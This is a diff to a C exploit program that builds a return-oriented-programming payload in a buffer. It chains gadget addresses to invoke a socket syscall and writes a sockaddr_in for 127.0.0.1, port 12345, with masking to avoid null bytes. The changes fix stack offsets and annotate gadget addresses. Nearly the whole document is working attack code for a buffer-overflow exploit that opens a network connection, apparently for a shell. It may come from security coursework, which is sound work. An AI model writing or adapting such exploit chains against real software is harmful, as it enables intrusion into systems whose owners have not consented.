@@ -58,13 +58,13 @@ int main(void)
   
   char con_arg_ip[] = "\x7f\x01\x01\x01";
   char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
-  char con_arg_ip_addr[] = "\x28\x68\xbf\xbf"; // bufr + 267
+  char con_arg_ip_addr[] = "\x2c\x68\xbf\xbf"; // bufr + 271
 
-  // bufr + 259
+  // bufr + 267
   // info.filler = "\x01"
   // info.af_inent = "\x02"
   // info.port_num = "\x39\x30"
-  // bufr + 263
+  // bufr + 271
   // info.ip_addr = "\x01\x01\x01\x01" filler value, should be 0x0100007f before syscall
   // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"
 
@@ -120,7 +120,7 @@ int main(void)
   // trap into the kernel for _socket30 syscall
   strcpy(bufr + 223, trap);  // location is 0xbfbf67fc
   // jump 12 bytes to next gadget
-  strcpy(bufr + 227, jump_12);
+  strcpy(bufr + 227, jump_12); // 0xbbaa8b68
   // socket arg 1 -> 2
   strcpy(bufr + 231, "\x01\x01\x01\x01");
   // socket arg 2 -> 1
@@ -129,7 +129,7 @@ int main(void)
   strcpy(bufr + 239, "\x01\x01\x01\x01");
 
   // pop ip_address without null chars into edx
-  strcpy(bufr + 243, pop_edx);
+  strcpy(bufr + 243, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 247, con_arg_ip);
   // pop mask into eax
   strcpy(bufr + 251, pop_eax);
@@ -138,10 +138,10 @@ int main(void)
   strcpy(bufr + 259, and_eax_edx);
                                   // eax should have 0x0100007f
   // store socket struct and jump over it
-  strcpy(bufr + 263, jump_16);
+  strcpy(bufr + 263, jump_16); // 0xbbad012a
   strcpy(bufr + 267, sockaddr_in);
   // pop ip address addr into edx
-  strcpy(bufr + 283, pop_edx);
+  strcpy(bufr + 283, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 287, con_arg_ip_addr);
   // write eax to where edx points
   strcpy(bufr + 291, write_at_edx_from_eax);
